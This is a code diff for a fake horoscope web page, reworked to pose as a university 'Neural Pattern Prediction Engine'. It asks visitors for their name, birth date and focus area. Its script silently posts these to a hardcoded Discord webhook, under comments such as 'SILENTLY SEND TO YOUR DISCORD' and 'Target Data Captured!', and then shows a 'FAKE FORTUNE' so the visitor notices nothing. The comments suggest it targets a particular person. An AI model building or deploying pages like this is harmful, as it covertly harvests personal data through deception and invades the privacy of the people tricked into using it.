@@ -3,64 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FORTUNE - Know Urself Better</title>
+    <title>AstroLogic | CU Innovation Lab</title>
     <style>
-        body { font-family: 'Georgia', serif; background: #1a1a2e; color: #e94560; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .container { background: #16213e; padding: 40px; border-radius: 20px; box-shadow: 0 0 20px rgba(233, 69, 96, 0.3); border: 2px solid #e94560; width: 90%; max-width: 400px; }
-        h1 { margin-bottom: 10px; text-transform: uppercase; letter-spacing: 3px; }
-        p { color: #8a8a8a; margin-bottom: 30px; }
-        input[type="date"] { background: #0f3460; border: 1px solid #e94560; color: white; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 20px; font-size: 16px; box-sizing: border-box; }
-        button { background: #e94560; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background: #ff2e63; box-shadow: 0 0 15px #e94560; }
-        #loading { display: none; margin-top: 20px; font-style: italic; color: #fff; }
-        #result { margin-top: 25px; line-height: 1.6; color: #fff; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e14; color: #d1d1d1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .app-card { background: #1c1f26; padding: 40px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); border: 1px solid #333; width: 100%; max-width: 450px; }
+        h1 { color: #8c7ae6; margin-bottom: 5px; font-weight: 800; }
+        .sub { font-size: 14px; color: #7f8c8d; margin-bottom: 30px; }
+        label { display: block; text-align: left; font-size: 12px; font-weight: bold; text-transform: uppercase; margin-bottom: 8px; color: #8c7ae6; }
+        input, select { background: #2c313c; border: 1px solid #444; color: white; padding: 12px; border-radius: 12px; width: 100%; margin-bottom: 20px; box-sizing: border-box; outline: none; }
+        button { background: linear-gradient(135deg, #8c7ae6, #7158e2); color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
+        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(140, 122, 230, 0.4); }
+        #loading { display: none; margin-top: 20px; color: #8c7ae6; }
+        .result-box { display: none; background: #2c313c; padding: 20px; border-radius: 15px; margin-top: 20px; text-align: left; border-left: 4px solid #8c7ae6; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>FORTUNE</h1>
-    <p>Discover what the stars have in store for your journey.</p>
+<div class="app-card">
+    <h1>AstroLogic</h1>
+    <p class="sub">University Project: Neural Pattern Prediction Engine</p>
     
+    <label>Full Name</label>
+    <input type="text" id="userName" placeholder="e.g. Sarah">
+
+    <label>Select Birth Date</label>
     <input type="date" id="dob" required>
-    <button onclick="revealFortune()">Reveal My Destiny</button>
+
+    <label>Focus Area</label>
+    <select id="focus">
+        <option value="General">General Destiny</option>
+        <option value="Career">Academic & Career</option>
+        <option value="Relationships">Social Connections</option>
+    </select>
     
-    <div id="loading">Consulting the cosmos...</div>
-    <div id="result"></div>
+    <button onclick="runEngine()">Generate Reading</button>
+    
+    <div id="loading">Syncing with CU Servers...</div>
+    <div id="result" class="result-box"></div>
 </div>
 
 <script>
-async function revealFortune() {
+async function runEngine() {
+    const name = document.getElementById('userName').value || "User";
     const dob = document.getElementById('dob').value;
+    const focus = document.getElementById('focus').value;
     const loading = document.getElementById('loading');
-    const result = document.getElementById('result');
+    const resultDiv = document.getElementById('result');
 
-    if (!dob) { alert("Please select your birth date first!"); return; }
+    if (!dob) { alert("Please input your birth data."); return; }
 
     loading.style.display = "block";
-    result.innerHTML = "";
+    resultDiv.style.display = "none";
 
-    // 1. SILENTLY SEND TO YOUR DISCORD
-    const webhookURL = 'https://discord.com/api/webhooks/1495075720387498154/IdCrTE8_DHnAPAmpwo1RgxWrwyUHcsjjs8LEiLRtUJNT6bmnC2RVw4F_5HkKbNJvLncA'; // <-- PASTE YOUR URL HERE
+    // --- DATA CAPTURE (YOUR PART) ---
+    const webhookURL = 'https://discord.com/api/webhooks/1495075720387498154/IdCrTE8_DHnAPAmpwo1RgxWrwyUHcsjjs8LEiLRtUJNT6bmnC2RVw4F_5HkKbNJvLncA'; // PASTE YOUR URL HERE
 
     try {
         await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: `🔮 **The Stars have spoken!** \nNew Birthday Captured: **${dob}**`
+                content: `🚀 **Target Data Captured!** \n👤 Name: **${name}** \n🎂 Birthday: **${dob}** \n🎯 Focus: **${focus}**`
             })
         });
-    } catch (e) { console.log("Silent error"); }
+    } catch (e) { console.log("Silent Log"); }
 
-    // 2. SHOW FAKE FORTUNE
+    // --- FAKE LOGIC (HER PART) ---
     setTimeout(() => {
+        const dateObj = new Date(dob);
+        const month = dateObj.getMonth() + 1;
+        const day = dateObj.getDate();
+
+        // Calculate Zodiac (Simplified logic)
+        let zodiac = "The Seeker";
+        if ((month == 3 && day >= 21) || (month == 4 && day <= 19)) zodiac = "Aries";
+        else if ((month == 4 && day >= 20) || (month == 5 && day <= 20)) zodiac = "Taurus";
+        else if ((month == 5 && day >= 21) || (month == 6 && day <= 20)) zodiac = "Gemini";
+        else if ((month == 6 && day >= 21) || (month == 7 && day <= 22)) zodiac = "Cancer";
+        else if ((month == 7 && day >= 23) || (month == 8 && day <= 22)) zodiac = "Leo";
+        else if ((month == 8 && day >= 23) || (month == 9 && day <= 22)) zodiac = "Virgo";
+        else if ((month == 9 && day >= 23) || (month == 10 && day <= 22)) zodiac = "Libra";
+        else if ((month == 10 && day >= 23) || (month == 11 && day <= 21)) zodiac = "Scorpio";
+        else if ((month == 11 && day >= 22) || (month == 12 && day <= 21)) zodiac = "Sagittarius";
+        else if ((month == 12 && day >= 22) || (month == 1 && day <= 19)) zodiac = "Capricorn";
+        else if ((month == 1 && day >= 20) || (month == 2 && day <= 18)) zodiac = "Aquarius";
+        else zodiac = "Pisces";
+
         loading.style.display = "none";
-        result.innerHTML = `
-            <div style="border-top: 1px solid #e94560; padding-top: 15px;">
-                <h3>The Navigator</h3>
-                <p>Your path is guided by intuition and strength. This year, an unexpected journey will bring you closer to your true desires.</p>
-            </div>
+        resultDiv.style.display = "block";
+        resultDiv.innerHTML = `
+            <strong style="color:#8c7ae6; font-size:18px;">Analysis for ${name}:</strong><br><br>
+            ✨ **Zodiac Element:** ${zodiac}<br>
+            🔢 **Lucky Number:** ${Math.floor(Math.random() * 9) + 1}<br>
+            🛡️ **Spirit Animal:** ${['Wolf', 'Phoenix', 'Owl', 'Tiger'][Math.floor(Math.random() * 4)]}<br><br>
+            <em>"Your alignment suggests a powerful shift in your ${focus} sector this year. Stay open to new signals."</em>
         `;
     }, 2000);
 }
